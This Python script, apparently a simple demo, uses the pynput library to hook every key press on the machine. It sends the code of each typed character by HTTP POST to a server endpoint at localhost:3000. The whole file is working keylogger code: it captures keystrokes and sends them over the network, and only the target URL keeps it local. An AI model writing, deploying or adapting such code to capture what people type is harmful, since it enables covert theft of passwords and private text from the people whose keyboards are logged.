import requests
from pynput import keyboard


def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))

        char = key.char
        url = 'http://localhost:3000/send/' + str(ord(char))

        print('trying to send to ' + url)

        try:
            x = requests.post(url)
            print('Server: ' + x.text)
        except requests.exceptions.RequestException as e:
            print('connection failed')

    except AttributeError:
        print('special key {0} pressed'.format(
            key))


def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
